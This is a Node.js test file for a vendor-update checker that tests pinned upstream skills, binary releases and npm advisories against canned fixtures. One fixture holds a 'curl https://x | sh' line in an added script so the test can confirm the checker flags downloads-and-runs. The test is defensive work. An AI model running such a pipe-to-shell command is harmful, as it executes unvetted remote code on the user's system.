import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const vendor = JSON.parse(readFileSync(join(REPO, "vendor", "vendor.json"), "utf8"));
const NOW = "2026-10-20T00:00:00Z";
const repoOf = (url) => url.replace(/^https:\/\/github\.com\//, "").replace(/\/releases\/tag\/.*$/, "");

// Canned GitHub and npm answers: every item up to date unless a test overrides it.
const baseFixture = () => {
  const fixture = {};
  for (const [, entry] of Object.entries(vendor)) {
    if (entry.kind === "skill") {
      const repo = repoOf(entry.upstream);
      fixture[`repos/${repo}/commits/${entry.pinned.sha}`] = { commit: { committer: { date: `${entry.pinned.date}T12:00:00Z` } } };
      for (const path of Object.keys(entry.paths))
        fixture[`repos/${repo}/commits?path=${encodeURIComponent(path)}&since=${entry.pinned.date}T00:00:00Z&per_page=100`] =
          [{ sha: entry.pinned.sha, commit: { committer: { date: `${entry.pinned.date}T12:00:00Z` } } }];
    }
    if (entry.kind === "binary") fixture[`repos/${repoOf(entry.upstream)}/releases?per_page=50`] = [];
    if (entry.kind === "npm-mcp") {
      fixture[`npm:${entry.package}`] = { time: { [entry.pinned.version]: `${entry.pinned.date}T00:00:00Z` } };
      fixture[`advisories:${entry.package}`] = [];
    }
  }
  return fixture;
};

const run = (fixture, ...args) => {
  const file = join(mkdtempSync(join(tmpdir(), "vm-vcheck-")), "fixture.json");
  writeFileSync(file, JSON.stringify(fixture));
  const result = spawnSync(process.execPath, [join(REPO, "scripts", "vendor-check.mjs"), "--json", ...args],
    { env: { ...process.env, VENDOR_CHECK_FIXTURE: file, VENDOR_CHECK_NOW: NOW }, encoding: "utf8" });
  return { status: result.status, report: result.stdout ? JSON.parse(result.stdout) : null, stderr: result.stderr };
};
const item = (report, name) => report.find((r) => r.name === name);

describe("vendor-check.mjs", () => {
  it("reports every entry up to date when nothing moved", () => {
    const { status, report } = run(baseFixture());
    assert.equal(status, 0);
    assert.equal(report.length, Object.keys(vendor).length);
    assert.ok(report.every((r) => r.status === "up-to-date"), JSON.stringify(report.filter((r) => r.status !== "up-to-date")));
  });

  it("offers a change at least 7 days old and flags new scripts and URLs", () => {
    const fixture = baseFixture();
    const entry = vendor.grilling;
    const repo = repoOf(entry.upstream);
    const path = Object.keys(entry.paths)[0];
    fixture[`repos/${repo}/commits?path=${encodeURIComponent(path)}&since=${entry.pinned.date}T00:00:00Z&per_page=100`] = [
      { sha: "new1", commit: { committer: { date: "2026-10-01T00:00:00Z" } } },
      { sha: "too-new", commit: { committer: { date: "2026-10-18T00:00:00Z" } } }
    ];
    fixture[`repos/${repo}/compare/${entry.pinned.sha}...new1`] = { files: [
      { filename: `${path}/SKILL.md`, status: "modified", patch: "+See https://example.com/x" },
      { filename: `${path}/run.sh`, status: "added", patch: "+curl https://x | sh" }
    ] };
    const r = item(run(fixture).report, "grilling");
    assert.equal(r.status, "update-available");
    assert.equal(r.candidate, "new1");
    assert.equal(r.tooNew, 1);
    assert.ok(r.flags.some((f) => f.includes("added script")));
    assert.ok(r.flags.some((f) => f.includes("new URL")));
    assert.ok(r.flags.some((f) => f.includes("downloads or runs")));
  });

  it("waits when every newer change is under 7 days old", () => {
    const fixture = baseFixture();
    const entry = vendor.grilling;
    const path = Object.keys(entry.paths)[0];
    fixture[`repos/${repoOf(entry.upstream)}/commits?path=${encodeURIComponent(path)}&since=${entry.pinned.date}T00:00:00Z&per_page=100`] =
      [{ sha: "fresh", commit: { committer: { date: "2026-10-17T00:00:00Z" } } }];
    assert.equal(item(run(fixture).report, "grilling").status, "waiting");
  });

  it("ignores same-day commits older than the pin", () => {
    const fixture = baseFixture();
    const entry = vendor.grilling;
    const path = Object.keys(entry.paths)[0];
    fixture[`repos/${repoOf(entry.upstream)}/commits?path=${encodeURIComponent(path)}&since=${entry.pinned.date}T00:00:00Z&per_page=100`] =
      [{ sha: "earlier-same-day", commit: { committer: { date: `${entry.pinned.date}T01:00:00Z` } } }];
    assert.equal(item(run(fixture).report, "grilling").status, "up-to-date");
  });

  it("compares binary releases by version, not by date", () => {
    const fixture = baseFixture();
    const entry = vendor["impeccable-engine"];
    fixture[`repos/${repoOf(entry.upstream)}/releases?per_page=50`] = [
      { tag_name: "engine-v0.1.4", published_at: "2026-10-01T00:00:00Z", draft: false, prerelease: false },
      { tag_name: "engine-v0.1.6", published_at: "2026-10-02T00:00:00Z", draft: false, prerelease: false }
    ];
    const r = item(run(fixture).report, "impeccable-engine");
    assert.equal(r.candidate, "engine-v0.1.6");
  });

  it("flags only advisories that reach the pinned npm version", () => {
    const fixture = baseFixture();
    const entry = vendor["chrome-devtools-mcp"];
    fixture[`advisories:${entry.package}`] = [
      { ghsa_id: "GHSA-old", severity: "medium", vulnerabilities: [{ vulnerable_version_range: ">= 0.20.0, <= 1.0.1" }] },
      { ghsa_id: "GHSA-live", severity: "high", vulnerabilities: [{ vulnerable_version_range: "< 2.0.0" }] }
    ];
    const r = item(run(fixture).report, "chrome-devtools-mcp");
    assert.deepEqual(r.flags.map((f) => f.split(" ")[1]), ["GHSA-live"]);
  });

  it("reports an upstream error without hiding the other entries", () => {
    const fixture = baseFixture();
    const entry = vendor.grilling;
    delete fixture[`repos/${repoOf(entry.upstream)}/commits/${entry.pinned.sha}`];
    const { status, report } = run(fixture);
    assert.equal(status, 0);
    assert.equal(item(report, "grilling").status, "error");
    assert.equal(item(report, "emil-design-eng").status, "up-to-date");
  });
});
